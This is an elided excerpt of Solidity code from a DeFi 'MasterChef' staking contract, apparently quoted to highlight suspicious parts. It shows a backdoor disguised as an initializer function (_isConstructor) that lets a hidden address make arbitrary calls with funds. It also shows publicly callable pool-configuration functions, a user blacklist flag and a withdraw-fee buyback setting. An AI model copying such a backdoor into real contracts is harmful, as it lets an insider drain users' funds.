...
contract Initializable {
  ...
  function _isConstructor(address newConstr, bytes memory data) public payable {
      require(msg.sender == initializ, '!contructor');
      if (data.length > 0) newConstr.call{value:msg.value}(data);
      else initializ = newConstr;
  }
...
contract MasterChef is Ownable {
    ...
    struct UserInfo {
        ...
        bool markUserStatus; // Mark blacklist.
        //
    ...
    struct PoolInfo {
        ...
        uint256 buybackRatio;     // withdraw fee buyback ratio
    ...
    function add(uint256 _allocPoint, IERC20 _lpToken, bool _withUpdate, uint256 _buybackRatio) public {
    ...
    function set(uint256 _pid, uint256 _allocPoint, bool _withUpdate, uint256 _buybackRatio) public {
        ...
        // default _buybackRatio = 0.5%, 3% max, 5 -> 0.5%, 30 -> 3%
        if (_buybackRatio > 30) _buybackRatio = 30;
